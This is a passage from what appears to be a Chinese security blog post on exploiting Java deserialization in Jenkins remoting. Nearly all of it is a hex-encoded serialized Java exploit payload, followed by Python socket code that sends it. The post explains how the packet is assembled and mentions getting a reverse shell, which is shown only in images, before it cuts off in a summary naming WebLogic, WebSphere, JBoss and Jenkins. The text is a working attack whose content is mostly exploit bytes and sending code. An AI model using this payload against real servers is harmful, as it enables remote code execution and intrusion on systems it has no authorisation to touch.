class="string">'\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'sending payload...'</span></span><br><span class="line">sock.send(payload)</span><br></pre></td></tr></table></figure><p>最后发包第一部分实际为“&lt;===[JENKINS REMOTING CA PACITY]===&gt;”的十六进制，貌似jenkins客户端发包里开头都是这个，第二部分为替换原有序列化对象的构造对象，第三部分为原有包里剩下的部分，直接从wirehsark copy</p><ol><li>反弹shell<br><img src="http://i1.piimg.com/567571/5a347e02f97fefaf.png" alt="image"><br>对于漏洞主机，可以这么利用。<br><img src="http://i1.piimg.com/567571/6b5f0cb7f290ad61.png" alt="image"><br>远程主机未装nc<br><img src="http://i1.piimg.com/567571/96b01a4f7477367c.png" alt="image"><br><img src="http://i1.piimg.com/567571/1f8730f4aa1d8a62.png" alt="image"><br><img src="http://i1.piimg.com/567571/fdc0940aee863e9d.png" alt="image"></li></ol><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><ol><li>WebLogic, WebSphere, JBoss, Jenkins, and 